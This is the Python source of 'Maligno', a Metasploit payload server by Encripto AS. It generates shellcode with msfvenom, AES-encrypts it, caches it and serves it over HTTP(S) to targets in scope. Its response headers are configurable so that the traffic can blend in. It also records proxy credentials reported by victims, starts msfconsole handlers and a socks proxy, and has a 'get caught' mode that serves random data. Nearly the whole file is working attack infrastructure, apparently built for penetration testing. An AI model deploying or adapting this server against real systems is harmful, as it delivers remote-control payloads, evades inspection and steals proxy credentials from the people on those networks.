#!/usr/bin/python

################################################################
#                                                              #
# Maligno - A Metasploit payload server                        #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013-2016 Encripto AS. All rights reserved.        #
#                                                              #
# Maligno is licensed under the FreeBSD license.               #
# http://www.freebsd.org/copyright/freebsd-license.html        #
#                                                              #
################################################################


import os, sys, ssl, time, signal, threading, string, random
import libs.malcfg, libs.malout, libs.malnet, libs.malpay
from Crypto.Cipher import AES
from datetime import datetime
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
from SocketServer import ThreadingMixIn


__version__ = "2.5"
__author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"


def process_request_payload(self):
    self.server_version = profile_response_config["banner"]
    self.sys_version = ""

    if profile_response_config["protocol"].upper() == "HTTP/1.1":
        self.protocol_version = "HTTP/1.1"

    print "==================================================================="
    print "\n[{0}]\n".format(datetime.now().strftime("%d/%m/%y - %H:%M:%S"))
    libs.malout.print_info("New request from %s...\n" % self.client_address[0])

    if (self.client_address[0] in scope_config) or ("ANY" in scope_config):
        try:
            payload_ids = dict()
            payload_id = None

            cookie = None
            post_body = None
            default_file = "default"
            default_failsafe = "default_failsafe"
            failsafe_prepared = False
            header_content_length_present = False
            if server_config["failsafe"].upper() in ["TRUE"] and self.headers.has_key("Content-MD5"):
                unpacked_proxy = libs.malpay.unpack_data(self.headers.getheader("Content-MD5", 0), cipher)
                if unpacked_proxy:
                    libs.malout.print_warning("HTTP proxy detected in target network...")
                    libs.malout.print_warning("Meterpreter may have some trouble reaching your server...")
                    print ""
                    libs.malout.print_info("Starting failsafe payload for best results...")

                    for msfpayload in payload_config:
                        try:
                            if str(msfpayload["id"]).upper().find("FAILSAFE") > -1:
                                failsafe_package = ""
                                failsafe_default_file = default_failsafe
                                failsafe_cache_file = str(msfpayload["id"])
                                proxy_server_addr = None
                                proxy_server_port = None
                                proxy_server_cred = None
                                proxy_server_auth = None
                                unpacked_proxy = unpacked_proxy.split(":")
                                if len(unpacked_proxy) == 2:
                                    proxy_server_addr = unpacked_proxy[0]
                                    proxy_server_port = unpacked_proxy[1]
                                elif len(unpacked_proxy) == 4:
                                    proxy_server_addr = unpacked_proxy[0]
                                    proxy_server_port = unpacked_proxy[1]
                                    proxy_server_cred = unpacked_proxy[2]
                                    proxy_server_auth = unpacked_proxy[3]
                                    libs.malout.print_info("Target network proxy auth.: %s" % proxy_server_auth)
                                    libs.malout.print_info("Basic auth. captured credentials for WPAD or Proxy: %s\n" % proxy_server_cred)
                                else:
                                    raise

                                libs.malout.print_info("Generating msf resource file for %s..." % msfpayload["payload"])
                                libs.malout.generate_failsafe_resource_file(server_config,
                                                                            metasploit_config,
                                                                            profile_response_config,
                                                                            profile_client_header_config,
                                                                            msfpayload,
                                                                            proxy_server_addr,
                                                                            proxy_server_port,
                                                                            proxy_server_cred,
                                                                            proxy_server_auth)
                                libs.malout.print_info("Generating %s with msfvenom...\n" % msfpayload["payload"])
                                failsafe_shellcode = libs.malpay.generate_failsafe_shellcode(metasploit_config,
                                                                                             proxy_server_addr,
                                                                                             proxy_server_port,
                                                                                             proxy_server_cred,
                                                                                             proxy_server_auth,
                                                                                             msfpayload)
                                failsafe_package = libs.malpay.pack_data(failsafe_shellcode,
                                                                         cipher,
                                                                         profile_network_config,
                                                                         profile_response_config)
                                libs.malout.store_package_in_cache(metasploit_config["cachefolder"],
                                                                   failsafe_cache_file,
                                                                   failsafe_default_file,
                                                                   failsafe_package)
                                print ""
                                libs.malout.print_info("Starting msfconsole in a new terminal...")
                                libs.malnet.start_msfconsole(metasploit_config, "failsafe.rc")
                                failsafe_prepared = True
                        except:
                            libs.malout.print_error("Failsafe procedure did not work.")
                            libs.malout.print_error("Everything will continue as usual... Good luck!\n")
                            failsafe_prepared = False
                            pass

            if not failsafe_prepared:
                if self.headers.has_key("Cookie"):
                    cookie = self.headers.getheader("Cookie", 0)

                elif self.headers.has_key("cookie"):
                    cookie = self.headers.getheader("cookie", 0)

                if self.headers.has_key("content-length"):
                    content_length = int(self.headers.getheader("content-length", 0))
                    post_body = self.rfile.read(content_length)

                payload_ids["QUERYSTRING"] = libs.malnet.get_payload_id_from_path(self.path,
                                                                                  profile_request_config["parameter"])
                payload_ids["COOKIE"] = libs.malnet.get_payload_id_from_cookie(cookie,
                                                                               profile_request_config["parameter"])
                payload_ids["BODY"] = libs.malnet.get_payload_id_from_body(post_body,
                                                                           profile_request_config["parameter"])

                if profile_request_config["location"].upper() in ["QUERYSTRING"]:
                    libs.malout.print_info("Expecting payload ID in query string...")
                    if payload_ids["QUERYSTRING"]:
                        payload_id = payload_ids["QUERYSTRING"].replace(" ","").replace("\n","")
                        libs.malout.print_info("Payload ID \"%s\" found as expected..." % str(payload_id))

                    elif payload_ids["COOKIE"]:
                        libs.malout.print_info("Payload ID not found. Checking cookie...")
                        payload_id = payload_ids["COOKIE"].replace(" ","").replace("\n","")
                        libs.malout.print_ok("Payload ID \"%s\" found in cookie..." % str(payload_id))

                    elif payload_ids["BODY"]:
                        libs.malout.print_info("Payload ID not found. Checking body...")
                        payload_id = payload_ids["BODY"].replace(" ","").replace("\n","")
                        libs.malout.print_ok("Payload ID \"%s\" found in body..." % str(payload_id))

                    else:
                        libs.malout.print_error("Payload ID not found in any possible parameter locations...\n")
                        raise Exception()

                elif profile_request_config["location"].upper() in ["COOKIE"]:
                    libs.malout.print_info("Expecting payload ID in cookie...")
                    if payload_ids["COOKIE"]:
                        payload_id = str(payload_ids["COOKIE"]).replace(" ","").replace("\n","")
                        libs.malout.print_info("Payload ID \"%s\" found as expected..." % str(payload_id))

                    elif payload_ids["BODY"]:
                        libs.malout.print_info("Payload ID not found. Checking body...")
                        payload_id = payload_ids["BODY"].replace(" ","").replace("\n","")
                        libs.malout.print_ok("Payload ID \"%s\" found in body..." % str(payload_id))

                    elif payload_ids["QUERYSTRING"]:
                        libs.malout.print_info("Payload ID not found. Checking query string...")
                        payload_id = payload_ids["QUERYSTRING"].replace(" ","").replace("\n","")
                        libs.malout.print_ok("Payload ID \"%s\" found in query string..." % str(payload_id))

                    else:
                        libs.malout.print_error("Payload ID not found in any possible parameter locations...\n")
                        raise Exception()

                elif profile_request_config["location"].upper() in ["BODY"]:
                    libs.malout.print_info("Expecting payload ID in request body...")
                    if payload_ids["BODY"]:
                        payload_id = payload_ids["BODY"].replace(" ","").replace("\n","")
                        libs.malout.print_info("Payload ID \"%s\" found as expected..." % str(payload_id))

                    elif payload_ids["QUERYSTRING"]:
                        libs.malout.print_info("Payload ID not found. Checking query string...")
                        payload_id = payload_ids["QUERYSTRING"].replace(" ","").replace("\n","")
                        libs.malout.print_ok("Payload ID \"%s\" found in query string..." % str(payload_id))

                    elif payload_ids["COOKIE"]:
                        libs.malout.print_info("Payload ID not found. Checking cookie...")
                        payload_id = payload_ids["COOKIE"].replace(" ","").replace("\n","")
                        libs.malout.print_ok("Payload ID \"%s\" found in cookie..." % str(payload_id))

                    else:
                        libs.malout.print_error("Payload ID not found in any possible parameter locations...\n")
                        raise Exception()

            else:
                payload_id = failsafe_cache_file
                default_file = default_failsafe

            # Select cache file
            cache_path = libs.malnet.get_cache_file_path(payload_id, metasploit_config["cachefolder"], default_file)

            # Retrieve from cache
            package = ""
            print ""
            libs.malout.print_info("Reading packed shellcode from %s..." % cache_path)
            package = libs.malout.read_package_from_cache(cache_path)

            # Send the encrypted / encoded payload to the client
            print ""
            self.send_response(200)
            if profile_server_header_config:
                for header in profile_server_header_config:
                    if header:
                        if str(header["field"]).rstrip().lstrip().upper() in ["TRANSFER-ENCODING"] and str(header["value"]).rstrip().lstrip().upper() in ["CHUNKED"]:
                            #Mispelling in order to avoid chunked responses
                            self.send_header(str(header["field"]).rstrip().lstrip(), "chuncked")

                        elif str(header["field"]).rstrip().lstrip().upper() in ["CONTENT-LENGTH"]:
                            header_content_length_present = True
                            self.send_header(str(header["field"]).rstrip().lstrip(), len(package))

                        else:
                            self.send_header(str(header["field"]).rstrip().lstrip(), str(header["value"]).rstrip().lstrip())

                    else:
                        print ""
                        libs.malout.print_error("There was a problem while parsing one of the server headers. Ingnoring it...\n")

            if profile_response_config["protocol"].upper() == "HTTP/1.1" and not header_content_length_present:
                self.send_header("Content-length", len(package))

            self.end_headers()
            self.wfile.write(package)
            print ""
            libs.malout.print_ok("Package sent!")

            if server_config["failsafe"].upper() in ["TRUE"] and not failsafe_prepared:
                try:
                    profile_name = server_config["profile"].split("/")[-1].split(".")[0]
                    resource_file = [name for name in os.listdir('./msfresources') if name.startswith("%s_%s" % (payload_id, profile_name))][0]
                    print ""
                    libs.malout.print_info("Starting msfconsole in a new terminal with \"%s\" resource file..." % resource_file)
                    libs.malnet.start_msfconsole(metasploit_config, resource_file)
                except:
                    libs.malout.print_error("Could not locate a proper resource file. Msfconsole should be started manually...")

        except:
            libs.malout.print_error("Request with unexpected format!")
            libs.malout.print_info("Redirecting to last resort...\n")
            self.send_response(301)
            self.send_header("Location", profile_response_config["lastresort"])
            self.end_headers()

    else:
        libs.malout.print_error("Host not in scope!")
        libs.malout.print_info("Redirecting to last resort...\n")
        self.send_response(301)
        self.send_header("Location", profile_response_config["lastresort"])
        self.end_headers()

    print ""
    libs.malout.print_info("End of request\n")
    print "==================================================================="
    return


def generate_random_data(size=1, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def process_request_get_caught(self):
    header_content_length_present = False
    self.server_version = profile_response_config["banner"]
    self.sys_version = ""

    if profile_response_config["protocol"].upper() == "HTTP/1.1":
        self.protocol_version = "HTTP/1.1"

    print "==================================================================="
    print "\n[{0}]\n".format(datetime.now().strftime("%d/%m/%y - %H:%M:%S"))
    libs.malout.print_info("New request from %s...\n" % self.client_address[0])

    # If the request came from a host in scope, then process it
    if (self.client_address[0] in scope_config) or ("ANY" in scope_config):
        try:
            package = ""
            libs.malout.print_warning("Get caught mode enabled. Generating random data as payload...")
            package = libs.malpay.pack_data(generate_random_data(random.randint(1,1000)),
                                            cipher,
                                            profile_network_config,
                                            profile_response_config)

            # Send the encrypted / encoded payload to the client
            print ""
            self.send_response(200)
            if profile_server_header_config:
                for header in profile_server_header_config:
                    if header:
                        if str(header["field"]).rstrip().lstrip().upper() in ["TRANSFER-ENCODING"] and str(header["value"]).rstrip().lstrip().upper() in ["CHUNKED"]:
                            #Mispelling in order to avoid chunked responses
                            self.send_header(str(header["field"]).rstrip().lstrip(), "chuncked")

                        elif str(header["field"]).rstrip().lstrip().upper() in ["CONTENT-LENGTH"]:
                            header_content_length_present = True
                            self.send_header(str(header["field"]).rstrip().lstrip(), len(package))

                        else:
                            self.send_header(str(header["field"]).rstrip().lstrip(), str(header["value"]).rstrip().lstrip())

                    else:
                        print ""
                        libs.malout.print_error("There was a problem while parsing one of the server headers. Ingnoring it...\n")

            if profile_response_config["protocol"].upper() == "HTTP/1.1" and not header_content_length_present:
                self.send_header("Content-length", len(package))

            self.end_headers()
            self.wfile.write(package)
            print ""
            libs.malout.print_ok("Package sent!")

        except:
            libs.malout.print_error("Request with unexpected format!")
            libs.malout.print_info("Redirecting to last resort...\n")
            self.send_response(301)
            self.send_header("Location", profile_response_config["lastresort"])
            self.end_headers()

    else:
        libs.malout.print_error("Host not in scope!")
        libs.malout.print_info("Redirecting to last resort...\n")
        self.send_response(301)
        self.send_header("Location", profile_response_config["lastresort"])
        self.end_headers()

    print ""
    libs.malout.print_info("End of request\n")
    print "==================================================================="
    return


class HTTPHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if get_caught_mode:
            process_request_get_caught(self)
        else:
            process_request_payload(self)
        return


    def do_POST(self):
        if get_caught_mode:
            process_request_get_caught(self)
        else:
            process_request_payload(self)
        return

    def do_HEAD(self):
        if get_caught_mode:
            process_request_get_caught(self)
        else:
            process_request_payload(self)
        return


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


if __name__ == '__main__':

    libs.malout.print_header(__version__, __author__)

    server_config_file = "server_config.xml"
    metasploit_config = libs.malcfg.get_metasploit_config(server_config_file)
    payload_config = libs.malcfg.get_payload_config(server_config_file)
    scope_config = libs.malcfg.get_scope_config(server_config_file)
    server_config = libs.malcfg.get_server_config(server_config_file)

    profile_request_config = libs.malcfg.get_profile_request_config(server_config["profile"])
    profile_response_config = libs.malcfg.get_profile_response_config(server_config["profile"])
    profile_server_header_config = libs.malcfg.get_profile_server_header_config(server_config["profile"])
    profile_network_config = libs.malcfg.get_profile_network_config(server_config["profile"])
    profile_client_config = libs.malcfg.get_profile_client_config(server_config["profile"])
    profile_client_header_config = libs.malcfg.get_profile_client_header_config(server_config["profile"])

    index = 0
    generated = 0
    get_caught_mode = False
    cipher = AES.new(profile_network_config["secret"])
    if int(profile_network_config["getcaught"]) > 1:
        get_caught_mode = True

    if not get_caught_mode:
        for msfpayload in payload_config:
            index += 1
            libs.malout.print_info("Generating and caching shellcodes: %s of %s..." % (index, len(payload_config)))
            payload_generated = False
            while not payload_generated:

                try:
                    package = ""
                    default_file = "default"
                    cache_file = str(msfpayload["id"])
                    if cache_file.upper().find("FAILSAFE") == -1:
                        libs.malout.print_info("Generating msf resource file for %s...\n" % msfpayload["payload"])
                        libs.malout.generate_resource_file(server_config,
                                                           metasploit_config,
                                                           profile_response_config,
                                                           profile_client_header_config,
                                                           msfpayload)
                        libs.malout.print_info("Generating %s with msfvenom...\n" % msfpayload["payload"])
                        shellcode = libs.malpay.generate_shellcode(metasploit_config,
                                                                   server_config,
                                                                   msfpayload)
                        package = libs.malpay.pack_data(shellcode,
                                                        cipher,
                                                        profile_network_config,
                                                        profile_response_config)
                        libs.malout.store_package_in_cache(metasploit_config["cachefolder"],
                                                           cache_file,
                                                           default_file,
                                                           package)
                    else:
                        if server_config["failsafe"].upper() in ["TRUE"]:
                            libs.malout.print_info("Failsafe payload detected %s...\n" % msfpayload["payload"])
                            libs.malout.print_warning("Failsafe payload is enabled. Continuing...\n")
                            time.sleep(3)

                    generated += 1
                    payload_generated = True

                except IndexError:
                    c = ""
                    options = ["Y", "N", "y", "n"]
                    while c not in options:
                        time.sleep(0.5)

                        print ""
                        libs.malout.print_error("There was a problem generating the payload with msfvenom.")
                        c = raw_input("    Would you like to retry? [Y/N]: ")

                        if c.upper() == "N":
                            payload_generated = True

                        elif c.upper() == "Y":
                            print ""

            libs.malout.print_header(__version__, __author__)

    libs.malout.print_info("Starting Maligno...")

    if not generated and not get_caught_mode:
        libs.malout.print_error("No shellcode has been generated.")
        libs.malout.print_error("Maligno cannot continue without shellcodes.\n")
        libs.malout.print_error("Tips: Too many errors with msfvenom?")
        libs.malout.print_error("      Try to reduce the number of iterations and/or bad chars in your config file.\n")
        sys.exit()

    libs.malout.print_info("Checking for updates...")
    libs.malnet.check_for_updates(__version__)

    try:
        server = None
        if server_config["threading"].upper() in ["TRUE"]:
            server = ThreadedHTTPServer(('', int(server_config["port"])), HTTPHandler)
            libs.malout.print_info("Server multithreading support enabled...")

        else:
            server = HTTPServer(('', int(server_config["port"])), HTTPHandler)
            libs.malout.print_info("Server multithreading support disabled...")

        # If ssl is enabled, try to locate the SSL cert file
        if server_config["ssl"].upper() in ["TRUE"]:
            cert = open(server_config["sslcert"], 'r')
            cert.close()
            server.socket = ssl.wrap_socket (server.socket, certfile=server_config["sslcert"], server_side=True)
            libs.malout.print_info("SSL certificate file found. SSL enabled...")

        # Start proxy if enabled
        if server_config["proxy"].upper() in ["TRUE"]:
            print ""
            libs.malout.print_info("Starting Metasploit socks4a proxy...")
            proxy_process = libs.malnet.start_socks_proxy(metasploit_config, server_config["proxyport"])
            libs.malout.print_info("Proxy listening on port TCP %s...\n" % server_config["proxyport"])

        if server_config["failsafe"].upper() in ["TRUE"]:
            libs.malout.print_warning("Failsafe payload enabled...")

        libs.malout.print_info("Server profile \"%s\" loaded...\n" % server_config["profile"].split('/')[-1])
        if get_caught_mode:
            libs.malout.print_warning("Get caught mode is enabled.")
            libs.malout.print_warning("Maligno will ignore payload configuration and will serve random data instead...\n")

        libs.malout.print_info("Need help?")
        libs.malout.print_ok("Watch the Maligno Video Series - http://bit.ly/1vWDfR5\n")
        libs.malout.print_info("Maligno is up and running. Press CTRL+C to stop...\n")
        server.serve_forever()

    except ValueError:
        libs.malout.print_error("A valid server port must be provided in server config.\n")
        pass

    except IOError as e:
        if e.errno == 2:
            libs.malout.print_error("Could not find SSL certificate %s. Does the file exist?\n" % server_config["sslcert"])
            libs.malout.print_info("Tips: Run the installation file 'install.sh' in order to generate a self-signed certificate.")
            libs.malout.print_info("      Do not forget to check your server config as well.\n")

        else:
            libs.malout.print_error("Error: %s...\n" % e.strerror)

        sys.exit()

    except KeyboardInterrupt:

        # Remove cache files when interrupted
        print ""
        libs.malout.print_info("Removing cache files...")
        filelist = [ f for f in os.listdir(metasploit_config["cachefolder"]) ]
        for f in filelist:
            path = "%s/%s" % (metasploit_config["cachefolder"], f)
            os.remove(path)

        # Remove client files when interrupted
        libs.malout.print_info("Removing client files...")
        filelist = [ f for f in os.listdir("clients") ]
        for f in filelist:
            path = "%s/%s" % ("clients", f)
            os.remove(path)

        # Remove resource files when interrupted
        libs.malout.print_info("Removing resource files...")
        filelist = [ f for f in os.listdir(metasploit_config["resourcefolder"]) ]
        for f in filelist:
            path = "%s/%s" % (metasploit_config["resourcefolder"], f)
            os.remove(path)

        # Stop proxy process if active
        if server_config["proxy"].upper() in ["TRUE"]:
            libs.malout.print_info("Stopping socks4a proxy (PID: %s)..." % proxy_process.pid)
            try:
                os.killpg(proxy_process.pid, signal.SIGTERM)

            except OSError:
                libs.malout.print_info("Process already killed...")

        libs.malout.print_info("Stopping Maligno...\n")
        time.sleep(1)
        os.system("reset")
        sys.exit()